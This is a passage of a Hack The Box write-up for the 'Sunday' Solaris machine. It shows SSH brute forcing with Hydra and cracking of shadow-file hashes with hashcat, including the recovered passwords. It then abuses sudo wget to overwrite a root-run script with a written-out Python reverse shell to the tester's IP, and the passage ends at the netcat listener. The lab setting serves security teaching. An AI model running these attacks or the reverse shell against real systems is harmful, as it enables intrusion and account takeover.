+<span class="o">[</span><span class="n">WARNING</span><span class="o">]</span><span class="w"> </span><span class="n">Writing</span><span class="w"> </span><span class="k">restore</span><span class="w"> </span><span class="k">file</span><span class="w"> </span><span class="n">because</span><span class="w"> </span><span class="mi">45</span><span class="w"> </span><span class="n">final</span><span class="w"> </span><span class="n">worker</span><span class="w"> </span><span class="n">threads</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"> </span><span class="n">until</span><span class="w"> </span><span class="k">end</span><span class="p">.</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">45</span><span class="w"> </span><span class="n">targets</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">resolve</span><span class="w"> </span><span class="ow">or</span><span class="w"> </span><span class="n">could</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">be</span><span class="w"> </span><span class="n">connected</span><span class="w"></span>
+<span class="o">[</span><span class="n">ERROR</span><span class="o">]</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="n">targets</span><span class="w"> </span><span class="n">did</span><span class="w"> </span><span class="ow">not</span><span class="w"> </span><span class="n">complete</span><span class="w"></span>
+<span class="n">Hydra</span><span class="w"> </span><span class="p">(</span><span class="nl">https</span><span class="p">:</span><span class="o">//</span><span class="n">github</span><span class="p">.</span><span class="n">com</span><span class="o">/</span><span class="n">vanhauser</span><span class="o">-</span><span class="n">thc</span><span class="o">/</span><span class="n">thc</span><span class="o">-</span><span class="n">hydra</span><span class="p">)</span><span class="w"> </span><span class="n">finished</span><span class="w"> </span><span class="k">at</span><span class="w"> </span><span class="mi">2019</span><span class="o">-</span><span class="mi">12</span><span class="o">-</span><span class="mi">12</span><span class="w"> </span><span class="mi">10</span><span class="err">:</span><span class="mi">38</span><span class="err">:</span><span class="mi">50</span><span class="w"></span>
+</pre></div>
+
+
+<p>Although hydra threw an error and I was about to stop the scan, I still got a result straight after! So the password for the user sunny is <strong>sunday</strong>. To be fair, the first thing one has to do is trying few basic passwords and combinations of it. With that in mind we could have easily guessed it but the whole point here was to demonstrate a simple ssh brute-force attack.</p>
+<p>Now, I run the same brute force attack for the user sammy in the background and at the same time I try to ssh with sunny.</p>
+<div class="highlight"><pre><span></span><span class="n">user</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22022</span> <span class="n">sunny</span><span class="mf">@10.10.10.76</span>
+<span class="n">Unable</span> <span class="n">to</span> <span class="n">negotiate</span> <span class="n">with</span> <span class="mf">10.10.10.76</span> <span class="n">port</span> <span class="mi">22022</span><span class="o">:</span> <span class="n">no</span> <span class="n">matching</span> <span class="n">key</span> <span class="n">exchange</span> <span class="n">method</span> <span class="n">found</span><span class="p">.</span> <span class="n">Their</span> <span class="nl">offer</span><span class="p">:</span> <span class="n">gss</span><span class="o">-</span><span class="n">group1</span><span class="o">-</span><span class="n">sha1</span><span class="o">-</span><span class="n">toWM5Slw5Ew8Mqkay</span><span class="o">+</span><span class="n">al2g</span><span class="o">==</span><span class="p">,</span><span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group</span><span class="o">-</span><span class="n">exchange</span><span class="o">-</span><span class="n">sha1</span><span class="p">,</span><span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group1</span><span class="o">-</span><span class="n">sha1</span>
+</pre></div>
+
+
+<p>I googled this up and I found out at <a href="http://www.openssh.com/legacy.html">openssh.com</a> that this is a legacy issue and can be circumvented by using this command:</p>
+<div class="highlight"><pre><span></span><span class="n">user</span><span class="p">@</span><span class="nl">Kali</span><span class="p">:</span><span class="o">~</span><span class="err">$</span> <span class="n">ssh</span> <span class="o">-</span><span class="n">p</span> <span class="mi">22022</span> <span class="o">-</span><span class="n">oKexAlgorithms</span><span class="o">=+</span><span class="n">diffie</span><span class="o">-</span><span class="n">hellman</span><span class="o">-</span><span class="n">group1</span><span class="o">-</span><span class="n">sha1</span> <span class="n">sunny</span><span class="mf">@10.10.10.76</span>
+<span class="nl">Password</span><span class="p">:</span> 
+<span class="n">Last</span> <span class="nl">login</span><span class="p">:</span> <span class="n">Thu</span> <span class="n">Dec</span> <span class="mi">12</span> <span class="mi">10</span><span class="o">:</span><span class="mi">39</span><span class="o">:</span><span class="mi">10</span> <span class="mi">2019</span> <span class="n">from</span> <span class="mf">10.10.14.46</span>
+<span class="n">Sun</span> <span class="n">Microsystems</span> <span class="n">Inc</span><span class="p">.</span>   <span class="n">SunOS</span> <span class="mf">5.11</span>      <span class="n">snv_111b</span>        <span class="n">November</span> <span class="mi">2008</span>
+<span class="n">sunny</span><span class="p">@</span><span class="nl">sunday</span><span class="p">:</span><span class="o">~</span><span class="err">$</span>
+</pre></div>
+
+
+<p>I can see I am dealing with an old Solaris box. We could probably leverage some vulnerabilities later on given its age.</p>
+<p>For those unfamiliar with hackthebox, the objectives are mainly two. The first is to find a user.txt file (usually found in the user home) and the other is to find a root.txt file (usually found in /root) . Both files contain a hash that you can then submit to hackthebox to prove that you gained user access and then you were able to successfully escalate privileges to root. </p>
+<p>With that in mind I look for the user.txt file:</p>
+<div class="highlight"><pre><span></span><span class="n">sunny</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">find</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="o">-</span><span class="n">name</span><span class="w"> </span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w">                                                                                                                       </span><span class="nl">find</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">export</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sammy</span><span class="o">/</span><span class="p">.</span><span class="nl">gnome2</span><span class="p">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w">                                                                                                          </span><span class="nl">find</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">export</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sammy</span><span class="o">/</span><span class="p">.</span><span class="nl">gconf</span><span class="p">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w">                                                                                                            </span><span class="o">/</span><span class="n">export</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sammy</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w">     </span>
+
+<span class="n">sunny</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">cat</span><span class="w"> </span><span class="o">/</span><span class="n">export</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sammy</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="n">txt</span><span class="w">                                       </span>
+<span class="nl">cat</span><span class="p">:</span><span class="w"> </span><span class="o">/</span><span class="n">export</span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="n">sammy</span><span class="o">/</span><span class="n">Desktop</span><span class="o">/</span><span class="k">user</span><span class="p">.</span><span class="nl">txt</span><span class="p">:</span><span class="w"> </span><span class="n">Permission</span><span class="w"> </span><span class="n">denied</span><span class="w"></span>
+</pre></div>
+
+
+<p>looks like the file is located under the user sammy home directory and sunny does not have permission to access it.</p>
+<p>Probably the most immediate thing one should do is to check what the user sunny is allowed to do as root. The "sudo -l" command can help with that:</p>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:~$ sudo -l</span>
+<span class="err">User sunny may run the following commands on this host:</span>
+<span class="err">    (root) NOPASSWD: /root/troll</span>
+</pre></div>
+
+
+<p>I can see sunny is allowed to execute troll without the need of the password. When executing troll we just see</p>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:~$ sudo /root/troll</span>
+<span class="err">testing</span>
+<span class="err">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<p>which is not very useful.</p>
+<p>From Sunny to Sammy (hash brute force)</p>
+<p>Before doing some enumeration with aid of scripts I check the folder structure to see if we have something useful. </p>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:~$ cd /                                                                         </span>
+<span class="err">sunny@sunday:/$ ls -l</span>
+<span class="err">total 524</span>
+<span class="err">drwxr-xr-x   2 root root      4 2018-04-15 20:44 backup</span>
+<span class="err">lrwxrwxrwx   1 root root      9 2018-04-15 19:52 bin -&gt; ./usr/bin</span>
+<span class="err">drwxr-xr-x   6 root sys       7 2018-04-15 19:52 boot</span>
+<span class="err">drwxr-xr-x   2 root root      2 2018-04-16 15:33 cdrom</span>
+<span class="err">drwxr-xr-x 265 root sys     265 2019-12-12 09:30 dev</span>
+<span class="err">drwxr-xr-x  10 root sys      10 2019-12-12 09:30 devices</span>
+<span class="err">drwxr-xr-x  77 root sys     224 2019-12-12 11:34 etc</span>
+<span class="err">drwxr-xr-x   3 root root      3 2018-04-15 19:44 export</span>
+<span class="err">dr-xr-xr-x   1 root root      1 2019-12-12 09:31 home</span>
+<span class="err">drwxr-xr-x  19 root sys      20 2018-04-15 19:45 kernel</span>
+<span class="err">drwxr-xr-x  10 root bin     180 2018-04-15 19:45 lib</span>
+<span class="err">drwx------   2 root root      2 2009-05-14 21:27 lost+found</span>
+<span class="err">drwxr-xr-x   2 root root      4 2019-12-12 09:31 media</span>
+<span class="err">drwxr-xr-x   2 root sys       2 2018-04-15 19:52 mnt</span>
+<span class="err">dr-xr-xr-x   1 root root      1 2019-12-12 09:31 net</span>
+<span class="err">drwxr-xr-x   4 root sys       4 2018-04-15 19:52 opt</span>
+<span class="err">drwxr-xr-x   5 root sys       5 2009-05-14 21:21 platform</span>
+<span class="err">dr-xr-xr-x  56 root root 480032 2019-12-12 12:06 proc</span>
+<span class="err">drwx------   6 root root     13 2018-04-24 10:31 root</span>
+<span class="err">drwxr-xr-x   4 root root      4 2018-04-15 19:52 rpool</span>
+<span class="err">drwxr-xr-x   2 root sys      58 2018-04-15 19:53 sbin</span>
+<span class="err">drwxr-xr-x   4 root root      4 2009-05-14 21:18 system</span>
+<span class="err">drwxrwxrwt   4 root sys     384 2019-12-12 09:31 tmp</span>
+<span class="err">drwxr-xr-x  30 root sys      44 2018-04-15 19:46 usr</span>
+<span class="err">drwxr-xr-x  35 root sys      35 2018-04-15 20:26 var</span>
+</pre></div>
+
+
+<p>The / directory shows a backup folder which I don't think is a system default folder. </p>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:/backup$ ls -l</span>
+<span class="err">total 2</span>
+<span class="err">-r-x--x--x 1 root root  53 2018-04-24 10:35 agent22.backup</span>
+<span class="err">-rw-r--r-- 1 root root 319 2018-04-15 20:44 shadow.backup</span>
+<span class="err">sunny@sunday:/backup$ cat agent22.backup </span>
+<span class="c">cat: agent22.backup: Permission denied</span>
+<span class="err">sunny@sunday:/backup$ cat shadow.backup </span>
+<span class="c">mysql:NP:::::::</span>
+<span class="c">openldap:*LK*:::::::</span>
+<span class="c">webservd:*LK*:::::::</span>
+<span class="c">postgres:NP:::::::</span>
+<span class="c">svctag:*LK*:6445::::::</span>
+<span class="c">nobody:*LK*:6445::::::</span>
+<span class="c">noaccess:*LK*:6445::::::</span>
+<span class="c">nobody4:*LK*:6445::::::</span>
+<span class="c">sammy:$5$Ebkn8jlK$i6SSPa0.u7Gd.0oJOT4T421N2OvsfXqAT1vCoYUOigB:6445::::::</span>
+<span class="c">sunny:$5$iRMbpnBv$Zh7s6D7ColnogCdiVE5Flz9vCZOMkUFxklRhhaShxv3:17636::::::</span>
+</pre></div>
+
+
+<p>As shown above we have the hash of the user sammy and so we can try to crack it. First I checked online into one of the numerous websites to understand what kind of hash is this and the result is:</p>
+<blockquote>
+<p>sha256crypt, SHA256(Unix) </p>
+</blockquote>
+<p>then from the <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat official website hashes example</a> I found out that the corresponding hash-mode is 7400. With this knowledge we can shorten the time hashcat would take to crack the password since it will try less combinations. </p>
+<p>I run hashcat and after some time I got this result:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">hashcat</span><span class="w"> </span><span class="o">-</span><span class="n">m</span><span class="w"> </span><span class="mi">7400</span><span class="w"> </span><span class="o">/</span><span class="n">home</span><span class="o">/</span><span class="k">user</span><span class="o">/</span><span class="n">Documents</span><span class="o">/</span><span class="n">htb</span><span class="o">/</span><span class="n">boxes</span><span class="o">/</span><span class="n">sunday</span><span class="o">/</span><span class="n">sammy_hash</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w"> </span><span class="c1">--force                                                                        </span>
+<span class="n">hashcat</span><span class="w"> </span><span class="p">(</span><span class="n">v5</span><span class="mf">.1.0</span><span class="p">)</span><span class="w"> </span><span class="n">starting</span><span class="p">...</span><span class="w">                                                                                                                                                                  </span>
+
+<span class="n">OpenCL</span><span class="w"> </span><span class="n">Platform</span><span class="w"> </span><span class="n">#1</span><span class="err">:</span><span class="w"> </span><span class="n">The</span><span class="w"> </span><span class="n">pocl</span><span class="w"> </span><span class="n">project</span><span class="w">                                                                                                                                                          </span>
+<span class="o">====================================</span><span class="w">                                                                                                                                                          </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Device</span><span class="w"> </span><span class="n">#1</span><span class="err">:</span><span class="w"> </span><span class="n">pthread</span><span class="o">-</span><span class="n">Intel</span><span class="p">(</span><span class="n">R</span><span class="p">)</span><span class="w"> </span><span class="n">Core</span><span class="p">(</span><span class="n">TM</span><span class="p">)</span><span class="w"> </span><span class="n">i7</span><span class="o">-</span><span class="mi">6820</span><span class="n">HQ</span><span class="w"> </span><span class="n">CPU</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="mf">2.70</span><span class="n">GHz</span><span class="p">,</span><span class="w"> </span><span class="mi">1024</span><span class="o">/</span><span class="mi">2647</span><span class="w"> </span><span class="n">MB</span><span class="w"> </span><span class="n">allocatable</span><span class="p">,</span><span class="w"> </span><span class="mi">2</span><span class="n">MCU</span><span class="w">                                                                                                </span>
+
+<span class="nl">Hashes</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">digests</span><span class="p">;</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">unique</span><span class="w"> </span><span class="n">digests</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="k">unique</span><span class="w"> </span><span class="n">salts</span><span class="w">                                                                                                                                           </span>
+<span class="nl">Bitmaps</span><span class="p">:</span><span class="w"> </span><span class="mi">16</span><span class="w"> </span><span class="n">bits</span><span class="p">,</span><span class="w"> </span><span class="mi">65536</span><span class="w"> </span><span class="n">entries</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0000ffff</span><span class="w"> </span><span class="n">mask</span><span class="p">,</span><span class="w"> </span><span class="mi">262144</span><span class="w"> </span><span class="n">bytes</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="o">/</span><span class="mi">13</span><span class="w"> </span><span class="n">rotates</span><span class="w">                                                                                                                  </span>
+<span class="nl">Rules</span><span class="p">:</span><span class="w"> </span><span class="mi">1</span><span class="w">                                                                                                                                                                                      </span>
+
+<span class="n">Applicable</span><span class="w"> </span><span class="nl">optimizers</span><span class="p">:</span><span class="w">                                                                                                                                                                        </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Zero</span><span class="o">-</span><span class="n">Byte</span><span class="w">                                                                                                                                                                                   </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Single</span><span class="o">-</span><span class="n">Hash</span><span class="w">                                                                                                                                                                                 </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Single</span><span class="o">-</span><span class="n">Salt</span><span class="w">                                                                                                                                                                                 </span>
+
+<span class="n">Minimum</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="n">supported</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nl">kernel</span><span class="p">:</span><span class="w"> </span><span class="mi">0</span><span class="w">                                                                                                                                                </span>
+<span class="n">Maximum</span><span class="w"> </span><span class="n">password</span><span class="w"> </span><span class="n">length</span><span class="w"> </span><span class="n">supported</span><span class="w"> </span><span class="k">by</span><span class="w"> </span><span class="nl">kernel</span><span class="p">:</span><span class="w"> </span><span class="mi">256</span><span class="w"> </span>
+
+<span class="k">Dictionary</span><span class="w"> </span><span class="n">cache</span><span class="w"> </span><span class="nl">built</span><span class="p">:</span><span class="w">                                                                                                                                                                       </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Filename</span><span class="p">..</span><span class="err">:</span><span class="w"> </span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="w">                                                                                                                                                </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Passwords</span><span class="p">.</span><span class="err">:</span><span class="w"> </span><span class="mi">14344392</span><span class="w">                                                                                                                                                                        </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Bytes</span><span class="p">.....</span><span class="err">:</span><span class="w"> </span><span class="mi">139921507</span><span class="w">                                                                                                                                                                       </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Keyspace</span><span class="p">..</span><span class="err">:</span><span class="w"> </span><span class="mi">14344385</span><span class="w">                                                                                                                                                                        </span>
+<span class="o">*</span><span class="w"> </span><span class="n">Runtime</span><span class="p">...</span><span class="err">:</span><span class="w"> </span><span class="mi">2</span><span class="w"> </span><span class="n">secs</span><span class="w">                                                                                                                                                                          </span>
+
+<span class="o">[</span><span class="n">s</span><span class="o">]</span><span class="n">tatus</span><span class="w"> </span><span class="o">[</span><span class="n">p</span><span class="o">]</span><span class="n">ause</span><span class="w"> </span><span class="o">[</span><span class="n">b</span><span class="o">]</span><span class="n">ypass</span><span class="w"> </span><span class="o">[</span><span class="n">c</span><span class="o">]</span><span class="n">heckpoint</span><span class="w"> </span><span class="o">[</span><span class="n">q</span><span class="o">]</span><span class="n">uit</span><span class="w"> </span><span class="o">=&gt;</span><span class="w"> </span><span class="n">s</span><span class="w"></span>
+
+<span class="err">$</span><span class="mi">5</span><span class="err">$</span><span class="n">Ebkn8jlK</span><span class="err">$</span><span class="n">i6SSPa0</span><span class="p">.</span><span class="n">u7Gd</span><span class="mf">.0</span><span class="nl">oJOT4T421N2OvsfXqAT1vCoYUOigB</span><span class="p">:</span><span class="n">cooldude</span><span class="err">!</span><span class="w"></span>
+
+<span class="k">Session</span><span class="p">..........</span><span class="err">:</span><span class="w"> </span><span class="n">hashcat</span><span class="w"></span>
+<span class="n">Status</span><span class="p">...........</span><span class="err">:</span><span class="w"> </span><span class="n">Cracked</span><span class="w"></span>
+<span class="n">Hash</span><span class="p">.</span><span class="n">Type</span><span class="p">........</span><span class="err">:</span><span class="w"> </span><span class="n">sha256crypt</span><span class="w"> </span><span class="err">$</span><span class="mi">5</span><span class="err">$</span><span class="p">,</span><span class="w"> </span><span class="n">SHA256</span><span class="w"> </span><span class="p">(</span><span class="n">Unix</span><span class="p">)</span><span class="w"></span>
+<span class="n">Hash</span><span class="p">.</span><span class="n">Target</span><span class="p">......</span><span class="err">:</span><span class="w"> </span><span class="err">$</span><span class="mi">5</span><span class="err">$</span><span class="n">Ebkn8jlK</span><span class="err">$</span><span class="n">i6SSPa0</span><span class="p">.</span><span class="n">u7Gd</span><span class="mf">.0</span><span class="n">oJOT4T421N2OvsfXqAT1vCoYUOigB</span><span class="w"></span>
+<span class="nc">Time</span><span class="p">.</span><span class="n">Started</span><span class="p">.....</span><span class="err">:</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">22</span><span class="err">:</span><span class="mi">11</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="p">(</span><span class="mi">13</span><span class="w"> </span><span class="n">mins</span><span class="p">,</span><span class="w"> </span><span class="mi">5</span><span class="w"> </span><span class="n">secs</span><span class="p">)</span><span class="w"></span>
+<span class="nc">Time</span><span class="p">.</span><span class="n">Estimated</span><span class="p">...</span><span class="err">:</span><span class="w"> </span><span class="n">Thu</span><span class="w"> </span><span class="k">Dec</span><span class="w"> </span><span class="mi">12</span><span class="w"> </span><span class="mi">14</span><span class="err">:</span><span class="mi">35</span><span class="err">:</span><span class="mi">16</span><span class="w"> </span><span class="mi">2019</span><span class="w"> </span><span class="p">(</span><span class="mi">0</span><span class="w"> </span><span class="n">secs</span><span class="p">)</span><span class="w"></span>
+<span class="n">Guess</span><span class="p">.</span><span class="n">Base</span><span class="p">.......</span><span class="err">:</span><span class="w"> </span><span class="k">File</span><span class="w"> </span><span class="p">(</span><span class="o">/</span><span class="n">usr</span><span class="o">/</span><span class="n">share</span><span class="o">/</span><span class="n">wordlists</span><span class="o">/</span><span class="n">rockyou</span><span class="p">.</span><span class="n">txt</span><span class="p">)</span><span class="w"></span>
+<span class="n">Guess</span><span class="p">.</span><span class="n">Queue</span><span class="p">......</span><span class="err">:</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="n">Speed</span><span class="p">.</span><span class="n">#1</span><span class="p">.........</span><span class="err">:</span><span class="w">      </span><span class="mi">260</span><span class="w"> </span><span class="n">H</span><span class="o">/</span><span class="n">s</span><span class="w"> </span><span class="p">(</span><span class="mf">12.51</span><span class="n">ms</span><span class="p">)</span><span class="w"> </span><span class="err">@</span><span class="w"> </span><span class="nl">Accel</span><span class="p">:</span><span class="mi">128</span><span class="w"> </span><span class="nl">Loops</span><span class="p">:</span><span class="mi">64</span><span class="w"> </span><span class="nl">Thr</span><span class="p">:</span><span class="mi">1</span><span class="w"> </span><span class="nl">Vec</span><span class="p">:</span><span class="mi">8</span><span class="w"></span>
+<span class="n">Recovered</span><span class="p">........</span><span class="err">:</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span><span class="w"> </span><span class="n">Digests</span><span class="p">,</span><span class="w"> </span><span class="mi">1</span><span class="o">/</span><span class="mi">1</span><span class="w"> </span><span class="p">(</span><span class="mf">100.00</span><span class="o">%</span><span class="p">)</span><span class="w"> </span><span class="n">Salts</span><span class="w"></span>
+<span class="n">Progress</span><span class="p">.........</span><span class="err">:</span><span class="w"> </span><span class="mi">203776</span><span class="o">/</span><span class="mi">14344385</span><span class="w"> </span><span class="p">(</span><span class="mf">1.42</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="n">Rejected</span><span class="p">.........</span><span class="err">:</span><span class="w"> </span><span class="mi">0</span><span class="o">/</span><span class="mi">203776</span><span class="w"> </span><span class="p">(</span><span class="mf">0.00</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="k">Restore</span><span class="p">.</span><span class="n">Point</span><span class="p">....</span><span class="err">:</span><span class="w"> </span><span class="mi">203520</span><span class="o">/</span><span class="mi">14344385</span><span class="w"> </span><span class="p">(</span><span class="mf">1.42</span><span class="o">%</span><span class="p">)</span><span class="w"></span>
+<span class="k">Restore</span><span class="p">.</span><span class="n">Sub</span><span class="p">.</span><span class="n">#1</span><span class="p">...</span><span class="err">:</span><span class="w"> </span><span class="nl">Salt</span><span class="p">:</span><span class="mi">0</span><span class="w"> </span><span class="nl">Amplifier</span><span class="p">:</span><span class="mi">0</span><span class="o">-</span><span class="mi">1</span><span class="w"> </span><span class="nl">Iteration</span><span class="p">:</span><span class="mi">4992</span><span class="o">-</span><span class="mi">5000</span><span class="w"></span>
+<span class="n">Candidates</span><span class="p">.</span><span class="n">#1</span><span class="p">....</span><span class="err">:</span><span class="w"> </span><span class="n">coolster</span><span class="w"> </span><span class="o">-&gt;</span><span class="w"> </span><span class="n">chs2009</span><span class="w"></span>
+</pre></div>
+
+
+<p>so sammy's password is "cooldude!". </p>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:~$ su - sammy</span>
+<span class="c">Password: </span>
+<span class="err">Sun Microsystems Inc.   SunOS 5.11      snv_111b        November 2008</span>
+<span class="err">sammy@sunday:~$ id</span>
+<span class="err">uid=101(sammy) gid=10(staff) groups=10(staff)</span>
+</pre></div>
+
+
+<p>At this stage I was able to move to sammy's Desktop and read the user.txt file. Now let's see what we can do to root this box.</p>
+<div class="highlight"><pre><span></span><span class="err">sammy@sunday:~$ sudo -l</span>
+<span class="err">User sammy may run the following commands on this host:</span>
+<span class="err">    (root) NOPASSWD: /usr/bin/wget</span>
+</pre></div>
+
+
+<p>From the above extract we can see that sammy can run wget so we can use it to potentially download something to the victim box? During my research I found several methods for rooting this box. So I decided to try them all for learning purposes:</p>
+<h1>ROOT privesc</h1>
+<p>I found several ways to root this box and I will list them all here.</p>
+<h3>1. Overwriting troll</h3>
+<div class="highlight"><pre><span></span><span class="err">sunny@sunday:~$ sudo /root/troll</span>
+<span class="err">testing</span>
+<span class="err">uid=0(root) gid=0(root)</span>
+</pre></div>
+
+
+<p>Just to recap the above output shows what troll contains. </p>
+<p>I dowload a simple python shell in my kali box from the Internet and save the content in a file (shell.py)</p>
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre> 1
+ 2
+ 3
+ 4
+ 5
+ 6
+ 7
+ 8
+ 9
+10
+11
+12</pre></div></td><td class="code"><div class="highlight"><pre><span></span><span class="ch">#!/usr/bin/python</span>
+
+<span class="kn">import</span> <span class="nn">socket</span>
+<span class="kn">import</span> <span class="nn">subprocess</span>
+<span class="kn">import</span> <span class="nn">os</span>
+
+<span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="o">.</span><span class="n">socket</span><span class="p">(</span><span class="n">socket</span><span class="o">.</span><span class="n">AF_INET</span><span class="p">,</span><span class="n">socket</span><span class="o">.</span><span class="n">SOCK_STREAM</span><span class="p">)</span>
+<span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s2">&quot;10.10.14.46&quot;</span><span class="p">,</span><span class="mi">9999</span><span class="p">))</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">0</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">1</span><span class="p">)</span>
+<span class="n">os</span><span class="o">.</span><span class="n">dup2</span><span class="p">(</span><span class="n">s</span><span class="o">.</span><span class="n">fileno</span><span class="p">(),</span><span class="mi">2</span><span class="p">)</span>
+<span class="n">p</span><span class="o">=</span><span class="n">subprocess</span><span class="o">.</span><span class="n">call</span><span class="p">([</span><span class="s2">&quot;/bin/sh&quot;</span><span class="p">,</span><span class="s2">&quot;-i&quot;</span><span class="p">]);</span>
+</pre></div>
+</td></tr></table>
+
+<p>Then I create a simple python http server in the directory where the shell.py is located and I overwrite troll with shell.py:</p>
+<div class="highlight"><pre><span></span><span class="err">root@Kali:/home/user/Documents/htb/boxes/sunday# python -m SimpleHTTPServer </span>
+<span class="err">Serving HTTP on 0.0.0.0 port 8000 ...</span>
+</pre></div>
+
+
+<p>and from sunday:</p>
+<div class="highlight"><pre><span></span><span class="n">sammy</span><span class="nv">@sunday</span><span class="err">:</span><span class="o">~</span><span class="err">$</span><span class="w"> </span><span class="n">sudo</span><span class="w"> </span><span class="n">wget</span><span class="w"> </span><span class="nl">http</span><span class="p">:</span><span class="o">//</span><span class="mf">10.10.14.46</span><span class="err">:</span><span class="mi">8000</span><span class="o">/</span><span class="n">shell</span><span class="p">.</span><span class="n">py</span><span class="w"> </span><span class="o">-</span><span class="n">O</span><span class="w"> </span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">troll</span><span class="w"></span>
+<span class="c1">--21:01:45--  http://10.10.14.46:8000/shell.py</span>
+<span class="w">           </span><span class="o">=&gt;</span><span class="w"> </span><span class="err">`</span><span class="o">/</span><span class="n">root</span><span class="o">/</span><span class="n">troll</span><span class="s1">&#39;</span>
+<span class="s1">Connecting to 10.10.14.46:8000... connected.</span>
+<span class="s1">HTTP request sent, awaiting response... 200 OK</span>
+<span class="s1">Length: 246 [text/plain]</span>
+
+<span class="s1">100%[==================================================================================================================&gt;] 246           --.--K/s             </span>
+
+<span class="s1">21:01:45 (68.40 MB/s) - `/root/troll&#39;</span><span class="w"> </span><span class="n">saved</span><span class="w"> </span><span class="o">[</span><span class="n">246/246</span><span class="o">]</span><span class="w"></span>
+</pre></div>
+
+
+<p>now before running troll I open a netcat listener in my kali box:</p>
+<div class="highlight"><pre><span></span><span class="n">root</span><span class="nv">@Kali</span><span class="err">:</span><span class="o">~</span><span class="err">#</span><span class="w"> </span><span class="n">nc</span><span class="w"> </span><span class="o">-</span><span class="n">lvnp</span><span class="w"> </span><span class="mi">9999</span><span class="w"></span>
